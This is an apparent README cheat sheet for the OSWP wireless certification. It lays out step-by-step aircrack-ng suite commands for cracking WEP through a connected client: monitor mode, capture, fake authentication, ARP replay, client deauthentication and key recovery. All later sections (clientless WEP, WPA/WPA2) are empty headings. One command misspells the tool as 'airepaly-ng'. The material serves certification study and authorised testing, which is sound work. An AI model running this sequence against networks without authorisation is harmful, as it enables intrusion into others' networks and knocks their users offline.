# OSWP-CheatSheet
This repository contain a CheatSheet for OSWP &amp; WiFi Cracking.

# Table of Contents

* 1.0 [Cracking WEP](#WEP)
  * 1.1 [Via a Client](#WEP-Client)
  * 1.2 [Clientless](#WEP-Clientless)
  * 1.3 [Bypassing Shared Key Authentication](#WEP-Bypass-SKA)
* 2.0 [Cracking WPA/WPA2 PSK](#WPA)
  * 2.1 [Cracking WPA](#WPA-Crack)
  * 2.1 [Aicrack-ng and John The Ripper's](#WPA-Aicrack-JTR)
  * 2.2 [coWPAtty](#WPA-coWPAtty)
  * 2.3 [Pyrit](#WPA-Pyrit)

# Cracking Wep<a name="WEP"></a>

## WEP - Via a Client<a name="WEP-Client"></a>

Place your wireless card into monitor mode on the channel number of the AP:

```
airmon-ng start <interface> <AP channel>
```
 
Start and Airodump-ng capture filtering on the AP channel and BSSID, saving the file to disk:
 
```
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
```

Conduct a fake authentication attack against the AP:

```
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
```
 
Launch the ARP request replay attack:

```
aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
```
 
Deauthenticate the connected client to force new IV generation by the AP:

```
airepaly-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
```
 
Once a significant number of IVs have been captured, run Aircrack-ng against the Airodump capture:

```
aircrack-ng <capture>
```
 
## WEP - Clientless<a name="WEP-Clientless"></a>

## WEP - Bypassing Shared Key Authentication<a name="WEP-Bypass-SKA"></a>

# Cracking WPA/WPA2 PSK<a name="WPA"></a>

## WPA - Crack<a name="WPA-Crack"></a>

## Aircrack-ng and John The Ripper<a name="WPA-Aicrack-JTR"></a>

## coWPAtty<a name="WPA-coWPAtty"></a>

## Pyrit<a name="WPA-Pyrit"></a>

